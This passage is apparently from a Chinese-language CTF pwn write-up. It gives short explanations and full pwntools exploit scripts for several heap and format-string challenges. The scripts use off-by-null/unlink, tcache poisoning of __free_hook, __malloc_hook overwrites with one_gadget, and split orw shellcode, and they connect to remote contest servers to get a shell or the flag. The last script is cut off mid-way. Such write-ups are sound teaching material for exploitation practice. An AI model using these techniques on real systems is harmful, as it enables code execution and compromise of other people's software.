    r.sendlineafter('size: ', str(0x10))
    r.sendafter('content: ', '\x78')
    show()
    r.recvuntil('content:')
    libc.address = u64(r.recv(6).ljust(8, '\x00'))-344-0x10-libc.symbols['__malloc_hook']
    print hex(libc.address)
    sys_addr = libc.symbols['system']
    malloc_hook = libc.symbols['__malloc_hook']
    realloc_hook = libc.symbols['__realloc_hook']
    realloc = libc.symbols['realloc']
    rr = malloc_hook-0x8
    one = 0x4527a
    ogg = libc.address+one
    tar = realloc_hook+2
    tar = ogg
    for i in range(6):
        off = tar&0xff
        fmt = fmtstr_payload(6,{rr+i: off},write_size='byte')
        say(fmt)
        r.sendlineafter('?', '3'*(off-1))
        tar = tar>>8
    tar = realloc+12
    for i in range(6):
        off = tar&0xff
        fmt = fmtstr_payload(6,{malloc_hook+i: off},write_size='byte')
        say(fmt)
        r.sendlineafter('?', '3'*(off-1))
        tar = tar>>8
    sleep(0.2)
    r.sendline('1')
    sleep(0.2)
    r.sendline('10')
    r.interactive()
    #flag{006c45fa-81d5-45eb-8f8c-eb6833daadf5}
###  JigSaw’sCage
第一次输入数字时存在溢出，输入`0xe00000000`从而通过if语句的判断并执行`mprotect`修改heap段为`rwx`  
接下分别输入三段shellcode配合`jmp`指令执行orw
    from pwn import*
    context(os='linux', arch='amd64', log_level='debug')
    #r = process('./JigSAW')
    r = remote('47.104.71.220',10273)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    def add(idx):
        r.recvuntil('Choice :')
        r.sendline(str(1))
        r.recvuntil('Index? :')
        r.sendline(str(idx))
    def edit(idx, con):
        r.recvuntil('Choice :')
        r.sendline(str(2))
        r.recvuntil('Index? :')
        r.sendline(str(idx))
        r.recvuntil('iNput:')
        r.send(con)
    def delete(idx):
        r.recvuntil('Choice :')
        r.sendline(str(3))
        r.recvuntil('Index? :')
        r.sendline(str(idx))
    def test(idx):
        r.recvuntil('Choice :')
        r.sendline(str(4))
        r.recvuntil('Index? :')
        r.sendline(str(idx))
    def shwo(idx):
        r.recvuntil('Choice :')
        r.sendline(str(5))
        r.recvuntil('Index? :')
        r.sendline(str(idx))
    r.recvuntil('Name')
    r.sendline('ayoung')
    r.recvuntil('Make your Choice:')
    r.sendline(str(0xe00000000))
    add(0)
    add(1)
    add(2)
    add(3)
    shellcode1 = '''
    push 0x67616c66
    push rsp
    pop rdi
    push 0
    pop rdx
    push 2
    pop rax
    jmp $+0x13
    '''
    print (len(asm(shellcode1)))
    edit(0, asm(shellcode1))
    shell2 = '''
    syscall
    push 0
    pop rax
    push 3
    pop rdi
    push rbp
    pop rsi
    push 0x50
    pop rdx
    jmp $+0x13
    '''
    print (len(asm(shell2)))
    edit(1, asm(shell2))
    shell3 = '''
    syscall
    push 1
    push 1
    pop rax
    pop rdi
    push rbp
    pop rsi
    push 0x50
    pop rdx
    syscall
    '''
    print (len(asm(shell3)))
    edit(2, asm(shell3))
    #gdb.attach(r)
    test(0)
    r.interactive()
    #flag{58591d4d-068f-47ed-9305-a65762917b06}
###  PassWordBox_FreeVersion
第一次申请的时候拿到异或加密的值用来控制之后输入的内容
chunk a (unsorted bin)  
chunk b used  
chunk c used  
伪造chunk c的`prevsize`位为chunk a+b，利用off by null溢出chunk c的`preinuse`位，free chunk
c，发生unlink造成chunk overlap，然后泄露基址再用tcache打free_hook即可。过程中需要避开tcache的影响
    from pwn import*
    context(os='linux', arch='amd64', log_level='debug')
    #r = process('./pwdFree')
    r = remote('47.104.71.220', 38562)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    def add(id, len, pwd):
        r.sendlineafter('Input Your Choice:', str(1))
        r.sendlineafter('Input The ID You Want Save:', id)
        r.sendlineafter('Length Of Your Pwd:', str(len))
        r.sendlineafter('Your Pwd:', pwd)
    def edit(idx, con):
        r.sendlineafter('Input Your Choice:', str(2))
        sleep(0.1)
        r.sendline(str(idx))
        sleep(0.1)
        r.send(con)
    def show(idx):
        r.sendlineafter('Input Your Choice:', str(3))
        r.sendlineafter('Which PwdBox You Want Check:', str(idx))
    def delete(idx):
        r.sendlineafter('Input Your Choice:', str(4))
        r.sendlineafter('Idx you want 2 Delete:', str(idx))
    def decode(str, key):
        tmp = ''
        for i in range(len(str)):
            tmp += chr((ord(str[i]) ^ ord(key[i%8])))
        return tmp
    add('AAAA', 0xf0, '\x00')
    r.recvuntil('First Add Done.Thx 4 Use. Save ID:')
    r.recv(32)
    key = r.recv(8)
    for i in range(0xe):
        add('AAAA', 0xf0, decode('B'*0xf0, key))
    for i in range(7):
        delete(9-i)
    delete(0)
    delete(1)
    for i in range(7):
        add('AAAA', 0xf0, decode('A'*0xf0, key))
    add('AAAA', 0xf0, decode('B'*0xf0, key)) #8
    add('AAAA', 0xf0, decode('B'*0xf0, key)) #9
    for i in range(7):
        delete(i)
    delete(8)
    for i in range(7):
        add('AAAA', 0xf0, decode('A'*0xf0, key))
    delete(9)
    add('AAAA', 0xf8, decode('A'*0xf0+p16(0x200)+'\x00'*0x6, key))
    for i in range(4):
        delete(i)
    for i in range(3):
        delete(i+5)
    delete(4)
    for i in range(7):
        add('AAAA', 0xf0, decode('a'*0xf0, key))
    add('AAAA', 0xf0, decode('a'*0xf0, key))#7
    show(8)
    r.recvuntil('Pwd is: ')
    addr = u64( decode((r.recv(6)), key).ljust(8,'\x00')  )
    libc.address = addr-96-0x10-libc.symbols['__malloc_hook']
    print 'libc_base ===> ', hex(libc.address)
    free_hook = libc.symbols['__free_hook']
    sys_addr = libc.symbols['system']
    add('AAAA', 0xf0, decode('a'*0xf0, key))
    add('AAAA', 0xf0, decode('a'*0xf0, key))
    delete(12)
    delete(11)
    delete(8)
    edit(9, p64(free_hook))
    add('AAAA', 0xf0, decode('/bin/sh\x00', key))
    add('AAAA', 0xf0, decode(p64(sys_addr), key))
    delete(8)
    r.interactive()
    #flag{2db0e64f-afe1-44d4-9af9-ae138da7bb4b}
###  lemon
在第一个game里，输入 FFFF 即可将flag内容放到栈上  
第二个game里的color功能存在堆溢出，eat功能会打印堆地址  
color改地址使其指向tcache_perthread_struct并修改来构造unsortedbin，爆破stdout并泄露真实地址，同理用environ泄露栈地址，stdout打印flag。
    #! /usr/bin/env python
    # -*- coding: utf-8 -*-    from pwn import *
    import os
    import sys
    context(os='linux',arch='amd64')
    context.log_level = 'debug'
    # p = process("./lemon_pwn")
    p = remote("47.104.70.90", 34524)
    libc = ELF('./libc-2.26.so')
    def chioce(idx):
        p.sendlineafter(">>>",str(idx))
    def get(idx, name, size, data):
        chioce(1)
        p.sendlineafter("index of your lemon:",str(idx))
        p.sendafter("name your lemon:",name)
        p.sendlineafter("of message for you lemon: ",str(size))
        p.sendafter("Leave your message:",data)
    def get_err(idx, name, size):
        chioce(1)
        p.sendlineafter("index of your lemon:",str(idx))
        p.sendafter("name your lemon:",name)
        p.sendlineafter("of message for you lemon: ",str(size))
    def eat(idx):
        chioce(2)
        p.sendlineafter("\n",str(idx))
        try:
            p.recvuntil("eat eat eat ")
            ret =  int(p.recvline()[:-4])
            heap_addr = hex(ret)
            log.success("heap_addr : "+str(heap_addr))
            return ret
        except:
            sys.stdout.flush()
            os.execv(sys.argv[0], sys.argv)
    def throw(idx):
        chioce(3)
        p.recvuntil('\n')
        p.sendline(str(idx))